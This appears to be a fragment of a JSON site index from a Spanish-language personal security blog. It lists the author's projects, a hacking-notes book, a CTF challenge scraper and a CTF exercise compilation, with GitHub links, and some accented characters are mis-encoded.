Hackthebox.","title":"Mi Primer CTF"},{"content":"Secronomic√≥n URL: https://srrequiem.xyz/Secronomicon\nGITHUB: https://github.com/srrequiem/Secronomicon\n Libro de notas donde encontrar√°s cada truco/t√©cnica/gu√≠a de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.\n  CTFScrapper GITHUB: https://github.com/srrequiem/CTFScrapper\n Proyecto creado con la intenci√≥n de recopilar los retos presentados en los CTFs mediante la generaci√≥n de un ambiente de trabajo local con los archivos y con la informaci√≥n de los retos.\n  CTF Challenge Compilation GITHUB: https://github.com/srrequiem/CTF-Challenge-Compilation\n Repositorio realizado con la finalidad de tener un compendio de ejercicios de CTFs en los que se ha participado.\n ","permalink":"https://srrequiem.xyz/projects/","summary":"projects","title":"Proyectos personales"}]